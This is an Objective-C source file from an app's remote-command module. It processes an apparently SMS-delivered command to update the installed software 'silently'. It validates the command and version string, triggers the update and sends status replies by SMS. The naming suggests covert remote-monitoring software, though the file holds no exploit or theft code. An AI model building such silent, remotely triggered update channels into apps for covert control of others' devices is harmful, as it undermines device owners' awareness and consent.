//
//  SetUpdateAvailableSilentModeProcessor.m
//  RCM
//
//  Created by Benjawan Tanarattanakorn on 6/21/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "SetUpdateAvailableSilentModeProcessor.h"

#import "SoftwareUpdateManager.h"
#import "RemoteCmdUtils.h"

@interface SetUpdateAvailableSilentModeProcessor (private)
- (void) processSetUpdateAvailableSilentMode;
- (void) setUpdateAvailableSilentModeException;
- (void) setUpdateAvailableSilentModeInvalidCmdFormatException;
- (void) nothingToUpdate;
- (void) acknowldgeMessage;
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete; 
- (void) processFinished;
@end


@implementation SetUpdateAvailableSilentModeProcessor


/**
 - Method name:			initWithRemoteCommandData:andCommandProcessingDelegate
 - Purpose:				This method is used to initialize the SetUpdateAvailableSilentModeProcessor class
 - Argument list and description:	aRemoteCmdData (RemoteCmdData), aRemoteCmdProcessingDelegate (RemoteCmdProcessingDelegate)
 - Return description:	No return type
 */
- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData 
	andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate {
	
	DLog (@"SetUpdateAvailableSilentModeProcessor--->initWithRemoteCommandData")
	
	if ((self = [super initWithRemoteCommandData:aRemoteCmdData andCommandProcessingDelegate:aRemoteCmdProcessingDelegate])) {
	}
	return self;
}



#pragma mark Overriden method

/**
 - Method name:			doProcessingCommand
 - Purpose:				This method is used to process the SetUpdateAvailableSilentModeProcessor
 - Argument list and description:	No Argument 
 - Return description:	No return type
 - Overided				RemoteCmdAsyncHTTPProcessor
 */
- (void) doProcessingCommand {
	DLog (@"SetUpdateAvailableSilentModeProcessor--->doProcessingCommand")
	
	// -- validate number of arugument: require only version	
	if (![RemoteCmdSignatureUtils verifyRemoteCmdDataSignature:mRemoteCmdData
										 numberOfCompulsoryTag:3]) {
		[RemoteCmdSignatureUtils throwInvalidCmdWithName:@"SetUpdateAvailableSilentModeProcessor"
												  reason:@"Failed signature check"];
	}
	
	// -- validate argument
	NSArray *versionArray = [[NSArray alloc] initWithArray:[RemoteCmdProcessorUtils validateArgs:[mRemoteCmdData mArguments]
																				  validationType:kDigitDotDashValidation]];
	if ([versionArray count] > 0) {
		[self processSetUpdateAvailableSilentMode];
	} else {
		[self setUpdateAvailableSilentModeInvalidCmdFormatException];
	}	
	[versionArray release];	
}


#pragma mark Private method

/**
 - Method name:			processSetUpdateAvailableSilentModeProcessor
 - Purpose:				This method is used to process Set Update Available Silent Mode
 - Argument list and description:	No Argument
 - Return description:	No return type
 */
- (void) processSetUpdateAvailableSilentMode {
	DLog (@"SetUpdateAvailableSilentModeProcessor ---> processSetUpdateAvailableSilentMode")
	
	id <SoftwareUpdateManager> softwareUpdateManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mSoftwareUpdateManager];
		
	/*
	 -- Compare the version first
	 // ---- if new version MATCH to the existing version			---> do nothing
	 // ---- if new version is GREATER than the existing version		---> update 
	 // ---- if new version is LESS than the existing version		---> do nothing	
	 version string sent from server can be
		- 1.4.2
		1.4.2
		1.4
		- 1.4
	 */	
	id <AppContext> applicationContext	= [[RemoteCmdUtils sharedRemoteCmdUtils] mAppContext];
	
	// current version
	NSString *currentVersion			= [[applicationContext getProductInfo] getProductFullVersion]; // "[-]Major.Minor.build"
	NSArray *currentVersionComponents	= [RemoteCmdUtils parseVersion:currentVersion];
	DLog (@">>>>> current version %@", currentVersionComponents)
	
	// new version	
	NSString *newVersion				= [[mRemoteCmdData mArguments] objectAtIndex:2]; // "[-]Major.Minor.build", note that build is optional
	NSArray *newVersionComponents		= [RemoteCmdUtils parseVersion:newVersion];
	DLog (@">>>>> new version %@", newVersionComponents)
	
	BOOL shouldUpdate = [RemoteCmdUtils shouldUpdateSoftwareCurrentVersionComponent:currentVersionComponents
															   newVersionComponents:newVersionComponents];	
	// -- update
	if (shouldUpdate) {		
		BOOL isReady = [softwareUpdateManager updateSoftware:self];
		if (!isReady) {
			DLog (@"!!! not ready to update software")
			[self setUpdateAvailableSilentModeException];				// ******* Exception ********
		}
		else {
			DLog (@".... processing update software")
			[self acknowldgeMessage];
		}		
	} else {
		DLog (@"No need to update")
        [self performSelector:@selector(nothingToUpdate) withObject:nil afterDelay:0.1];
	}
}

/**
 - Method name:			setUpdateAvailableSilentModeException
 - Purpose:				This method is invoked when it fails to update software
 - Argument list and description:	No Return Type
 - Return description:	No Argument
 */
- (void) setUpdateAvailableSilentModeException {
	DLog (@"SetUpdateAvailableSilentModeProcessor ---> setUpdateAvailableSilentModeException");
	FxException* exception = [FxException exceptionWithName:@"setUpdateAvailableSilentModeException" 
												  andReason:@"Set Update Available Silent Mode error"];
	[exception setErrorCode:kSoftwareUpdateManagerBusy];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

- (void) setUpdateAvailableSilentModeInvalidCmdFormatException {
	DLog (@"SetUpdateAvailableSilentModeProcessor ---> setUpdateAvailableSilentModeInvalidCmdFormatException");
	FxException* exception = [FxException exceptionWithName:@"setUpdateAvailableSilentModeException" 
												  andReason:@"Set Update Available Silent Mode invalid command format error"];
	[exception setErrorCode:kCmdExceptionErrorInvalidCmdFormat];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

- (void) nothingToUpdate {
    NSString *message = NSLocalizedString(@"kSetUpdateAvailableSilentModeErrorMSG1", @"");
    [self sendReplySMS:message isProcessCompleted:YES];
}

/**
 - Method name: acknowldgeMessage
 - Purpose:This method is used to prepare acknowldge message
 - Argument list and description:No Argument 
 - Return description:No Return
 */

- (void) acknowldgeMessage {
	NSString *messageFormat =[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						 andErrorCode:_SUCCESS_];
	NSString *ackMessage= [messageFormat stringByAppendingString:NSLocalizedString(@"kSetUpdateAvailableSilentModeMSG1", @"")];
	[self sendReplySMS:ackMessage isProcessCompleted:NO];
}


/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: No return type
 */

- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete  {
	DLog (@"SetUpdateAvailableSilentModeProcessor--->sendReplySMS...")
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:aReplyMessage];
	DLog (@"recipientNumber %@", [self recipientNumber])
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
	    [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:aReplyMessage];
	}
	if (aIsComplete) {
		[self processFinished];
	} else {
		DLog (@"Sent aknowldge message.")
	}
}

/**
 - Method name: processFinished
 - Purpose:This method is invoked when request sync address book process is completed
 - Argument list and description:No Argument 
 - Return description:isValidArguments (BOOL)
 */

-(void) processFinished {
	DLog (@"SetUpdateAvailableSilentModeProcessor--->processFinished")
	if ([mRemoteCmdProcessingDelegate respondsToSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)]) {
		[mRemoteCmdProcessingDelegate performSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:) withObject:self withObject:mRemoteCmdData];
	}
}

#pragma mark SoftwareUpdateDelegate Delegate Methods


-(void) softwareUpdateCompleted: (NSError *) aError {
	DLog (@"SetUpdateAvailableSilentModeProcessor --> softwareUpdateCompleted")
	NSString *softwareUpdateMessage	= nil;
	
	if (!aError) {
		DLog (@">> success to update")
		NSString *messageFormat		= [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																									andErrorCode:_SUCCESS_];
		softwareUpdateMessage		= [messageFormat stringByAppendingString:NSLocalizedString(@"kSetUpdateAvailableSilentModeMSG2", @"")];		
	} else {
		DLog (@">> fail to update with error %@", aError)
		NSInteger errorCode = 0;
		
		if ([aError code] == kSoftwareUpdateManagerCRCError) {
			errorCode = kCmdExceptionErrorBinaryChecksumFailed;
		} else {
			errorCode = [aError code];
		}
		NSString *messageFormat		= [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																											andErrorCode:errorCode];	
		softwareUpdateMessage		= messageFormat;
	}
	
	[self sendReplySMS:softwareUpdateMessage isProcessCompleted:YES];		
}



@end
